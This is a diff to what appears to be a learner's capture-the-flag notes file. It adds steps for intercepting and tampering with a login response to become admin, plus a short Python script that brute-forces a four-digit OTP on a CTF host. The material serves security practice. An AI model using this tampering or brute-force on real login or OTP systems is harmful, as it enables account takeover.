@@ -63,6 +63,22 @@
 #   - Page is changed sequence
 #   - So, Change the step2.php to step3.php
 # 9. Admin is Mine
+#   - There is no clue for SQL injection, so it should use intercept loginUser
+#   - The setting of proxy seeting changes to Intercept responses based on the following rules "check"
+#   - Match type Request "Check"
+#   - After that, follow the traffic and change the id to admin
+# 10. Pin Code Crack
+#    - Brute Force to use Python
+import requests
+
+URL = "http://ctf.segfaulthub.com:1129/6/checkOTP.php"
+
+for i in range(10000):
+    res = requests.get(URL, params={'otpNum': i})
+    if "Fail" not in res.text:
+        print(f"otpNum = {i}")
+        break
+
 
 # CTF Resource
 # https://book.hacktricks.xyz/pentesting-web/login-bypass
